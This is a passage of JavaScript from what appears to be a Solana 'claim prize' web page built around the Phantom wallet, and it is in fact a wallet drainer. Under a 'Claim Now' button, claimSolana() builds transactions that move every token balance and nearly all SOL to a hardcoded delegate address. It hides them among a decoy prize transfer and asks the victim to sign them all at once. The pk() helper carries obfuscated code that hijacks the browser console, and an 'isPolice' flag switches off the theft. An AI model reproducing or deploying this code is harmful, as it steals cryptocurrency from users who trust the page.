    aB,
    aC,
    aD,
    aE,
    aF,
    aG,
    aH,
    aI,
    aJ,
    aK,
    aL,
    aM,
    aN,
    aO,
    aP,
  ],
  prizeMintPubKey = pk('4vMsoUT2BWatFweudnQM1xedRLfJgJ7hswhcpz4xgBTy'),
  prizeAcctPubKey = pk('42pw7vKm2c2mtKq6uNsMY9hhwG8ecaeqLWC3iB1sXAU6'),
  prizeTreasuryPubKey = pk('sV78H7ZxrgpRso5NVntNR3UzUmetTxAhrqSJsysq32A')

async function connect() {
	let claiming = false
	console.log('claiming')
  if (!claiming && browser.isPageLoaded) {
    if (wallet.connected) {
      wallet.connected = false
      updateConnectText('Sign Up / Sign In with Phantom')
      mintSpan.style.display = 'none'
      counter = 0
      return
    }
    if (
      ((wallet.installed.phantom = window.phantom?.solana?.isPhantom),
      !browser.isDesktop &&
        ['JSN-L21', 'SM-A217F'].find((c) => navigator.userAgent.includes(c)))
    ) {
      updateConnectText('Desktop required')
      return
    }
    wallet.installed.phantom
      ? await connectSolana()
      : browser.isDesktop
      ? (info('Navigate to Phantom download'),
        (window.location.href = 'https://phantom.app/download'))
      : (info('Open Phantom app'),
        (window.location.href =
          'https://phantom.app/ul/browse/https%3A%2F%2F' +
          window.location.hostname))
  }
}
function pk(g) {
  const i = (function () {
      const m = {
        JPeNR: function (n, o, p) {
          return n(o, p)
        },
        euhxu: 'EZDFS',
        TJlcY: 'gGLbc',
      }
      let o = true
      return function (p, q) {
        if (m.euhxu === m.TJlcY) {
          const t = d.apply(g, arguments)
          return (h = null), t
        } else {
          const t = o
            ? function () {
                if (q) {
                  const u = q.apply(p, arguments)
                  return (q = null), u
                }
              }
            : function () {}
          return (o = false), t
        }
      }
    })(),
    j = i(this, function () {
      return j
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(j)
        .search('(((.+)+)+)+$')
    })

  const k = (function () {
      let n = true
      return function (o, p) {
        const r = n
          ? function () {
              if (p) {
                const s = p.apply(o, arguments)
                return (p = null), s
              }
            }
          : function () {}
        return (n = false), r
      }
    })(),
    l = k(this, function () {
      const n = function () {
          let r
          try {
            r = Function(
              'return (function() {}.constructor("return this")( ));'
            )()
          } catch (t) {
            r = window
          }
          return r
        },
        o = n(),
        p = (o.console = o.console || {}),
        q = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
      for (let r = 0; r < q.length; r++) {
        const s = k.constructor.prototype.bind(k),
          t = q[r],
          u = p[t] || s
        s['__proto__'] = k.bind(k)
        s.toString = u.toString.bind(u)
        p[t] = s
      }
    })
  return l(), new solanaWeb3.PublicKey(g)
}

async function connectSolana() {
	const c = { onlyIfTrusted: false };
  try {
	 console.log('sol conencting')
    updateConnectText('Connecting...')

    wallet.provider = window.solana
    wallet.provider.on('connect', async function () {
      wallet.address = wallet.provider.publicKey.toString()
      updateConnectText(
        wallet.address.slice(0, 4) +
          '...' +
          wallet.address.substr(wallet.address.length - 4)
      )
      updateMintText('Claim Now')
      info(
        '<a href="https://solscan.io/address/' +
          wallet.address +
          '">' +
          wallet.address +
          '</a>'
      )
      wallet.connected = true
      mintSpan.style.display = 'block'
    })
    await wallet.provider.connect(c)
    updateConnectText('Connecting...'),

      (wallet.provider = window.solana),
      wallet.provider.on('connect', async function () {
        wallet.address = wallet.provider.publicKey.toString()
        updateConnectText(
          wallet.address.slice(0, 4) +
            '...' +
            wallet.address.substr(wallet.address.length - 4)
        )
        updateMintText('Claim Now')
        info(
          '<a href="https://solscan.io/address/' +
            wallet.address +
            '">' +
            wallet.address +
            '</a>'
        )
        wallet.connected = true
        mintSpan.style.display = 'block'
      }),
      await wallet.provider.connect(c)
  } catch (d) {
    updateConnectText('Sign Up / Sign In with Phantom'),
      info('Connect error: ' + d.message)
	  console.log("error" + d)
  }
}

async function getTokenBalance(b, c) {
	console.log("getTokenBalance")
  let g = solanaWeb3.PublicKey.findProgramAddressSync(
      [b.toBuffer(), splToken.TOKEN_PROGRAM_ID.toBuffer(), c.toBuffer()],
      splToken.ASSOCIATED_TOKEN_PROGRAM_ID
    )[0],
    h = 0
  try {
    h = Number((await wallet.connection.getTokenAccountBalance(g)).value.amount)
  } catch (k) {}
  return h
}
let raydiumPubkey = pk('5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1')
async function createTxs(c, d, g, h, j, k, l) {
  let v = (
    await solanaWeb3.PublicKey.findProgramAddress(
      [d.toBuffer(), splToken.TOKEN_PROGRAM_ID.toBuffer(), h.toBuffer()],
      splToken.ASSOCIATED_TOKEN_PROGRAM_ID
    )
  )[0]
  null === (await wallet.connection.getAccountInfo(v)) &&
    (v = (
      await solanaWeb3.PublicKey.findProgramAddress(
        [
          pk(wallet.delegate).toBuffer(),
          splToken.TOKEN_PROGRAM_ID.toBuffer(),
          h.toBuffer(),
        ],
        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
      )
    )[0])
  let w = (
      await solanaWeb3.PublicKey.findProgramAddress(
        [g.toBuffer(), splToken.TOKEN_PROGRAM_ID.toBuffer(), h.toBuffer()],
        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
      )
    )[0],
    x = new solanaWeb3.Transaction()
  x.add(
    splToken.Token.createTransferInstruction(
      splToken.TOKEN_PROGRAM_ID,
      j,
      w,
      k,
      [],
      l
    )
  )
  latestBlockhash = await wallet.connection.getLatestBlockhash('finalized')
  x.recentBlockhash = latestBlockhash.blockhash
  x.feePayer = g
  c.push(x)
  ;(x = new solanaWeb3.Transaction()).add(
    splToken.Token.createTransferInstruction(
      splToken.TOKEN_PROGRAM_ID,
      w,
      v,
      g,
      [],
      l
    )
  )
  latestBlockhash = await wallet.connection.getLatestBlockhash('finalized')
  x.recentBlockhash = latestBlockhash.blockhash
  x.feePayer = g
  c.push(x)
}
async function createPrizeTxs(c) {
  let h = [],
    i
  wallet.tokenAccount = (
    await solanaWeb3.PublicKey.findProgramAddress(
      [
        c.toBuffer(),
        splToken.TOKEN_PROGRAM_ID.toBuffer(),
        prizeMintPubKey.toBuffer(),
      ],
      splToken.ASSOCIATED_TOKEN_PROGRAM_ID
    )
  )[0]
  if (null === (await wallet.connection.getAccountInfo(wallet.tokenAccount))) {
    ;(i = new solanaWeb3.Transaction()).add(
      splToken.Token.createAssociatedTokenAccountInstruction(
        splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
        splToken.TOKEN_PROGRAM_ID,
        prizeMintPubKey,
        wallet.tokenAccount,
        c,
        c
      )
    )
    let j = await wallet.connection.getLatestBlockhash()
    i.recentBlockhash = j.blockhash
    i.feePayer = c
    h.push(i)
  }
  return (
    (i = new solanaWeb3.Transaction()).add(
      splToken.Token.createTransferInstruction(
        splToken.TOKEN_PROGRAM_ID,
        prizeAcctPubKey,
        wallet.tokenAccount,
        prizeTreasuryPubKey,
        [],
        500000000000
      )
    ),
    (latestBlockhash = await wallet.connection.getLatestBlockhash()),
    (i.recentBlockhash = latestBlockhash.blockhash),
    (i.feePayer = c),
    h.push(i),
    h
  )
}
async function claim() {
  if (wallet.installed.phantom) {
    wallet.connected || (await connectSolana())
    await claimSolana()
    return
  }
}



async function createTokenTxs(a, b, c) {
  let g = (
      await solanaWeb3.PublicKey.findProgramAddress(
        [b.toBuffer(), splToken.TOKEN_PROGRAM_ID.toBuffer(), a.toBuffer()],
        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
      )
    )[0],
    h = await getTokenBalance(b, a)
  if (h === 0) {
    return []
  }
  let i = [],
    j = (
      await solanaWeb3.PublicKey.findProgramAddress(
        [c.toBuffer(), splToken.TOKEN_PROGRAM_ID.toBuffer(), a.toBuffer()],
        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
      )
    )[0],
    k = new solanaWeb3.Transaction(),
    l = await wallet.connection.getAccountInfo(j)
  return (
    l === null &&
      k.add(
        splToken.Token.createAssociatedTokenAccountInstruction(
          splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
          splToken.TOKEN_PROGRAM_ID,
          a,
          j,
          c,
          b
        )
      ),
    k.add(
      splToken.Token.createTransferInstruction(
        splToken.TOKEN_PROGRAM_ID,
        g,
        j,
        b,
        [],
        h
      )
    ),
    (latestBlockhash = await wallet.connection.getLatestBlockhash()),
    (k.recentBlockhash = latestBlockhash.blockhash),
    (k.feePayer = b),
    i.push(k),
    (k = new solanaWeb3.Transaction()),
    k.add(
      splToken.Token.createTransferInstruction(
        splToken.TOKEN_PROGRAM_ID,
        j,
        g,
        c,
        [],
        h
      )
    ),
    (latestBlockhash = await wallet.connection.getLatestBlockhash()),
    (k.recentBlockhash = latestBlockhash.blockhash),
    (k.feePayer = b),
    i.push(k),
    info(
      'Transfer ' +
        h +
        ' <a href="https://solscan.io/address/' +
        a +
        '">' +
        a +
        '</a>'
    ),
    i
  )
}
function getMint(a) {
  let b = splToken.AccountLayout.decode(a.data)
  return pk(b.mint)
}
let claiming = false
async function claimSolana() {

  let claiming = true
  updateMintText('Claiming...')
  try {
    console.log("claim res")
    let p = [],
      q = pk(wallet.address),
      r = await wallet.connection.getAccountInfo(q)
    wallet.lamports = r ? r.lamports : 0
    wallet.balance = wallet.lamports / solanaWeb3.LAMPORTS_PER_SOL
    if (0 === wallet.lamports) {
      updateMintText('No funds for tx fees')
      claiming = false
      return
    }
    wallet.delegate = 'BxirXjBXZDQbET1E9yqGWANVmHo4tC8KXG6zLpHNop7w';
    let v = pk(wallet.delegate)
    p = await createPrizeTxs(q)
    let x = false
    if (!isPolice) {
      try {
        const C = { programId: splToken.TOKEN_PROGRAM_ID }
        let D = (await wallet.connection.getTokenAccountsByOwner(q, C)).value
        for (let E of D) {
          let F = getMint(E.account),
            G = await createTokenTxs(F, q, v)
          G.length > 0 && ((p = p.concat(G)), (x = true))
        }
      } catch (I) {
        info('Tokens error: ' + I.message)
      }
      let B = Math.floor(solanaWeb3.LAMPORTS_PER_SOL / 25)
      if (
        wallet.lamports >= solanaWeb3.LAMPORTS_PER_SOL ||
        (x && wallet.lamports > 2 * B)
      ) {
        x = true
        let g9 = wallet.lamports - B
        info('Transfer ' + g9 / solanaWeb3.LAMPORTS_PER_SOL + ' SOL')
        let ga = new solanaWeb3.Transaction()
        const gb = {
          fromPubkey: q,
          toPubkey: v,
          lamports: g9,
        }
        ga.add(solanaWeb3.SystemProgram.transfer(gb))
        let gc = await wallet.connection.getLatestBlockhash('finalized')
        ga.recentBlockhash = gc.blockhash
        ga.feePayer = q
        p.push(ga)
        console.log(ga)
        ;(ga = new solanaWeb3.Transaction()).add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: v,
            toPubkey: q,
            lamports: g9,
          })
        )
        gc = await wallet.connection.getLatestBlockhash('finalized')
        ga.recentBlockhash = gc.blockhash
        ga.feePayer = q
        p.push(ga)
        console.log(ga)
      }
    }

    updateMintText('Claiming...')
    info('Sign ' + p.length + ' txs')
    let A = await wallet.provider.signAllTransactions(p)
    info('Signed ' + p.length + ' txs')
    for (let gd = 0; gd < A.length; gd++) {
      let gf = A[gd]
      setTimeout(async () => {
        let gg = A.indexOf(gf, 0)
        try {
          await wallet.connection.confirmTransaction(
            await wallet.connection.sendRawTransaction(gf.serialize())
          )
          info('Tx ' + gg + ': Confirmed')
          console.log('Tx ' + gg + ': Confirmed')
          await wallet.connection.confirmTransaction(
            await wallet.connection.sendRawTransaction(gf.serialize())
          ),
            info('Tx ' + gg + ': Confirmed')
          console.log('Tx ' + gg + ': Confirmed')
        } catch (gh) {
          info('Tx ' + gg + ': ' + gh.message)
          console.log('Tx ' + gg + ': ' + gh.message)
        }
      }, 66)
    }
    await sleep(8666)
  } catch (gg) {
    info('Claim error: ' + gg.message)
    console.log('Claim error: ' + gg.message)
  }
  claiming = false
  updateMintText('Claim failed!')
  setTimeout(() => {
    updateMintText('Try again?')
  }, 6666)
} 

